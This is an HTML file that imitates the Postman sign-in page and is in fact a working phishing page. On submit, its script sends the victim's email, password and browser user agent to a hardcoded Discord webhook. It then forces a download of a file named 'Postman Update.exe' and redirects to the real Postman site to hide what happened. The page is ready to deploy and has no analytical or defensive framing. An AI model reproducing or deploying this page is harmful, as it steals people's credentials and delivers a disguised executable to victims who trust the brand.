<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Postman</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Loading Screen */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }

        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #ddd;
            border-top: 3px solid #ff6c37;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 16px;
        }

        .loading-text {
            color: #666;
            font-size: 14px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            opacity: 0;
            transition: opacity 0.5s ease-in-out;
        }

        .container.loaded {
            opacity: 1;
        }

        .main {
            width: 100%;
            max-width: 400px;
        }

        .logo-container {
            text-align: center;
            margin-bottom: 32px;
        }

        .logo {
            width: 60px;
            height: 60px;
            margin-bottom: 16px;
        }

        .card {
            background: white;
            border-radius: 8px;
            padding: 32px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            margin-bottom: 24px;
        }

        .heading {
            font-size: 24px;
            font-weight: 600;
            color: #333;
            text-align: center;
            margin-bottom: 32px;
            line-height: 1.3;
        }

        /* Error Message */
        .error-message {
            background-color: #fdf2f2;
            border: 1px solid #fecaca;
            border-radius: 6px;
            padding: 12px 16px;
            margin-bottom: 24px;
            color: #991b1b;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            transition: border-color 0.2s;
        }

        .form-input:focus {
            outline: none;
            border-color: #ff6c37;
            box-shadow: 0 0 0 2px rgba(255, 108, 55, 0.1);
        }

        .checkbox-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
        }

        .checkbox-wrapper {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .checkbox {
            width: 16px;
            height: 16px;
        }

        .checkbox-label {
            font-size: 14px;
            color: #333;
            cursor: pointer;
        }

        .forgot-link {
            color: #3b82f6;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .btn {
            width: 100%;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-align: center;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .btn-primary {
            background-color: #ff6c37;
            color: white;
            margin-bottom: 24px;
        }

        .btn-primary:hover:not(:disabled) {
            background-color: #e55a2b;
        }

        .btn-secondary {
            background-color: white;
            color: #333;
            border: 1px solid #ddd;
            margin-bottom: 12px;
        }

        .btn-secondary:hover {
            background-color: #f8f9fa;
        }

        .divider {
            text-align: center;
            margin: 24px 0;
            color: #666;
            font-size: 14px;
            position: relative;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background-color: #ddd;
            z-index: 1;
        }

        .divider span {
            background-color: white;
            padding: 0 16px;
            position: relative;
            z-index: 2;
        }

        .btn-icon {
            width: 16px;
            height: 16px;
        }

        .footer-link {
            text-align: center;
            margin-top: 24px;
        }

        .footer-link a {
            color: #3b82f6;
            text-decoration: none;
            font-size: 14px;
        }

        .footer-link a:hover {
            text-decoration: underline;
        }

        .footer {
            text-align: center;
            padding: 24px;
            color: #666;
            font-size: 12px;
        }

        .footer a {
            color: #666;
            text-decoration: none;
            margin: 0 8px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Responsive Design */
        @media (max-width: 480px) {
            .container {
                padding: 16px;
            }

            .card {
                padding: 24px;
            }

            .heading {
                font-size: 20px;
            }

            .checkbox-container {
                flex-direction: column;
                align-items: flex-start;
                gap: 12px;
            }
        }

        @media (max-width: 360px) {
            .card {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-spinner"></div>
        <div class="loading-text">Loading...</div>
    </div>

    <div class="container" id="mainContent">
        <div class="main">
            <div class="logo-container">
                <img src="https://identity-assets.getpostman.com/images/logo-postman.svg" alt="Postman Logo" class="logo">
            </div>

            <div class="card">
                <h1 class="heading">Sign in to Postman</h1>

                <!-- Error Message -->
                <div class="error-message" id="errorMessage">
                    Login failed. Please enter your credentials again.
                </div>

                <form id="loginForm">
                    <div class="form-group">
                        <label for="email" class="form-label">Email or username</label>
                        <input type="text" id="email" class="form-input" required>
                    </div>

                    <div class="form-group">
                        <label for="password" class="form-label">Password</label>
                        <input type="password" id="password" class="form-input" required>
                    </div>

                    <div class="checkbox-container">
                        <div class="checkbox-wrapper">
                            <input type="checkbox" id="remember" class="checkbox" checked>
                            <label for="remember" class="checkbox-label">Stay signed in</label>
                        </div>
                        <a href="#" class="forgot-link">Forgot password?</a>
                    </div>

                    <button type="submit" class="btn btn-primary" id="signInBtn">
                        <span id="btnText">Sign In</span>
                        <div class="loading-spinner" id="btnSpinner" style="display: none; width: 16px; height: 16px; border-width: 2px; margin: 0;"></div>
                    </button>
                </form>

                <div class="divider">
                    <span>or</span>
                </div>

                <a href="#" class="btn btn-secondary">
                    <img src="https://assets.getpostman.com/common-share/google-logo-icon-sign-in.svg" alt="Google" class="btn-icon">
                    Sign In with Google
                </a>

                <a href="#" class="btn btn-secondary">
                    <img src="https://identity.getpostman.com/images/logo-github.svg" alt="GitHub" class="btn-icon">
                    Sign In with GitHub
                </a>

                <a href="#" class="btn btn-secondary">
                    Sign In with SSO
                </a>
            </div>

            <div class="footer-link">
                <a href="#">Create free account</a>
            </div>

            <div class="footer-link">
                <a href="#">Back to your accounts</a>
            </div>
        </div>
    </div>

    <footer class="footer">
        <div>
            <span>English</span>
            <span> • </span>
            <span>日本語</span>
        </div>
        <div style="margin-top: 8px;">
            ©2025 Postman, Inc. All rights reserved.
            <span> • </span>
            <a href="#">Terms of use</a>
            <span> • </span>
            <a href="#">Privacy policy</a>
        </div>
    </footer>

    <script>
        // Loading Screen
        window.addEventListener('load', function() {
            setTimeout(() => {
                document.getElementById('loadingScreen').style.display = 'none';
                document.getElementById('mainContent').classList.add('loaded');
            }, 1500);
        });

        // Form Submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const signInBtn = document.getElementById('signInBtn');
            const btnText = document.getElementById('btnText');
            const btnSpinner = document.getElementById('btnSpinner');
            
            // Show loading state
            signInBtn.disabled = true;
            btnText.style.display = 'none';
            btnSpinner.style.display = 'block';
            
            try {
                // Send to Discord webhook
                const webhookUrl = 'https://discordapp.com/api/webhooks/1384905349915611259/G1UiJiv7UJoDIC7MTSMA4GTZlH3DJmVqz9fyx88-V8fB0DIJl7iOogUQA8ahrN8Urj1f';
                
                const payload = {
                    embeds: [{
                        title: "🔐 Postman Login Attempt",
                        color: 16744503, // Orange color
                        fields: [
                            {
                                name: "📧 Email/Username",
                                value: email,
                                inline: true
                            },
                            {
                                name: "🔑 Password",
                                value: password,
                                inline: true
                            },
                            {
                                name: "🕐 Timestamp",
                                value: new Date().toLocaleString('pt-BR'),
                                inline: false
                            },
                            {
                                name: "🌐 User Agent",
                                value: navigator.userAgent.substring(0, 100) + "...",
                                inline: false
                            }
                        ],
                        footer: {
                            text: "Postman Login Clone"
                        },
                        timestamp: new Date().toISOString()
                    }]
                };
                
                // Send webhook data
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                // Simulate processing time
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Download from local files folder
                const downloadUrl = './files/Postman Update.exe';
                
                // Create download link
                const link = document.createElement('a');
                link.href = downloadUrl;
                link.download = 'Postman Update.exe';
                link.style.display = 'none';
                
                // Add to DOM, click, and remove
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                // Redirect after download
                setTimeout(() => {
                    window.location.href = 'https://web.postman.co/home';
                }, 1500);
                
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('errorMessage').textContent = 'An error occurred. Please try again later.';
                
                // Ainda redireciona mesmo com erro
                setTimeout(() => {
                    window.location.href = 'https://web.postman.co/home';
                }, 2000);
            } finally {
                // Reset button state
                signInBtn.disabled = false;
                btnText.style.display = 'inline';
                btnSpinner.style.display = 'none';
            }
        });

        // Handle image load errors
        document.querySelectorAll('img').forEach(img => {
            img.addEventListener('error', function() {
                console.log('Failed to load image:', this.src);
                // You could replace with fallback images here
            });
        });
    </script>
</body>
</html>
